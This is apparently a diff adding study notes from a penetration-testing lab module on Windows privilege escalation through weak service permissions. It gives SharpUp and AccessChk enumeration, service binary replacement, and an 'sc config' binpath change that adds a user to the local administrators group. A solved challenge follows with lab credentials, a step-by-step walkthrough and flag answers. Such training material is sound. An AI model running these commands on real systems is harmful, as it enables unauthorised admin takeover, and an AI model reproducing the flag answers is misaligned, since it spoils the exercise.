@@ -1,1 +1,143 @@
 
+Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system.
+
+Running SharpUp
+We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
+
+PS SYNTAX: PS C:\htb> .\SharpUp.exe audit
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+
+=== Modifiable Service Binaries ===
+
+  Name             : SecurityService
+  DisplayName      : PC Security Management Service
+  Description      : Responsible for managing PC security
+  State            : Stopped
+  StartMode        : Auto
+  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+  
+  <SNIP>
+
+Replacing Service Binary
+This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom. It can give us a reverse shell as SYSTEM, or add a local admin user and give us full administrative control over the machine.
+
+CMD SYNTAX: C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+CMD SYNTAX: C:\htb> sc start SecurityService
+
+Weak Service Permissions
+Reviewing SharpUp Again
+Let's check the SharpUp output again for any modifiable services. We see the WindscribeService is potentially misconfigured.
+
+CMD SYNTAX: C:\htb> SharpUp.exe audit
+ 
+=== SharpUp: Running Privilege Escalation Checks ===
+ 
+ 
+=== Modifiable Services ===
+ 
+  Name             : WindscribeService
+  DisplayName      : WindscribeService
+  Description      : Manages the firewall and controls the VPN tunnel
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
+
+Checking Permissions with AccessChk
+Next, we'll use AccessChk from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are -q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access). Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.
+
+CMD SYNTAX: C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
+ 
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+ 
+WindscribeService
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+
+Check Local Admin Group
+Checking the local administrators group confirms that our user htb-student is not a member.
+
+CMD SYNTAX: C:\htb> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+ 
+Members
+ 
+-------------------------------------------------------------------------------
+Administrator
+mrb3n
+The command completed successfully.
+
+
+Changing the Service Binary Path
+We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).
+
+CMD SYNTAX: C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+
+[SC] ChangeServiceConfig SUCCESS
+
+Stopping Service
+Next, we must stop the service, so the new binpath command will run the next time it is started.
+
+CMD SYNTAX: C:\htb> sc stop WindscribeService
+ 
+SERVICE_NAME: WindscribeService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x4
+        WAIT_HINT          : 0x0
+
+Starting the Service 
+Since we have full control over the service, we can start it again, and the command we placed in the binpath will run even though an error message is returned. The service fails to start because the binpath is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the binpath.
+
+CMD SYNTAX: C:\htb> sc start WindscribeService
+
+[SC] StartService FAILED 1053:
+ 
+The service did not respond to the start or control request in a timely fashion.
+
+Confirming Local Admin Group Addition
+Finally, check to confirm that our user was added to the local administrators group.
+
+CMD SYNTAX: C:\htb> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+ 
+Members
+ 
+-------------------------------------------------------------------------------
+Administrator
+htb-student
+mrb3n
+The command completed successfully.
+
+
+
+Challenge :  RDP to 10.129.43.44 (ACADEMY-WINLPE-WS01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+Question 1 -  Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop. - Aud1t_th0se_s3rv1ce_p3rms! 
+1) xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!
+2) cmd prompt -> cd tools 
+3) .\SharpUp.exe audit
+4) accesschk.exe /accepteula -quvcw WindscribeService
+5) sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
+6) sc stop WindscribeService
+7) sc start WindscribeService
+8)  net localgroup administrators
+9) use cmd -> logoff 
+10) re-do xfreerdp 
+11) open cmd as admin
+12) type c:\Users\Adminsitrator\Desktop\WeakPerms\flag.txt -> Aud1t_th0se_s3rv1ce_p3rms!   -> can also get VulnServices folder adn flag too -> Aud1t_th0se_th1rd_paRty_s3rvices!
